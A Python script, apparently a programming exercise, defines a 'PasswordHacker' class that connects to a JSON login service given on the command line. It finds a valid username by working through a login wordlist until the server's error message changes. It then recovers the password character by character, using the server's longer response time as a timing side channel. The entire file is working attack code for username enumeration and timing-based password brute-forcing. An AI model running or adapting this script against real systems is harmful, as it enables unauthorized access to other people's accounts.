import socket
import string
import sys
import json
from time import time, perf_counter


class PasswordHacker:
    def __init__(self, hostname, port):
        self.hostname = hostname
        self.port = port
        self.response = ''
        self.login_file = 'logins.txt'

    def get_server_response(self):
        with socket.socket() as client_socket:
            client_socket.connect((self.hostname, self.port))
            # searching correct login
            login_from_file_generator = self.read_file(self.login_file)
            for login_variant in login_from_file_generator:
                request = {'login': login_variant, 'password': ''}
                json_request = json.dumps(request, indent=4)
                client_socket.send(json_request.encode())
                self.response = client_socket.recv(1024).decode()
                response_dict = json.loads(self.response)
                if response_dict.get('result') == 'Wrong password!':
                    admin_login = login_variant
                    break

            # searching correct password
            password_correct_part = ''
            while True:
                for character in set(string.ascii_letters + string.digits):
                    password_variant = f"{password_correct_part}{character}"
                    request = {'login': admin_login, 'password': password_variant}
                    json_request = json.dumps(request, indent=4)
                    start = perf_counter()
                    client_socket.send(json_request.encode())
                    self.response = client_socket.recv(1024).decode()
                    response_dict = json.loads(self.response)
                    finish = perf_counter()
                    time_difference = finish - start
                    if response_dict.get('result') == 'Connection success!':
                        return json_request
                    elif response_dict.get('result') == 'Wrong password!' and time_difference > 0.1:
                        password_correct_part = password_variant
                        break

    @staticmethod
    def read_file(file):
        with open(file, 'r') as file:
            for password_item in file.readlines():
                yield password_item.strip()


def main():
    hostname = sys.argv[1]
    port = int(sys.argv[2])
    password_hack = PasswordHacker(hostname, port)
    response = password_hack.get_server_response()
    print(response)


if __name__ == '__main__':
    main()
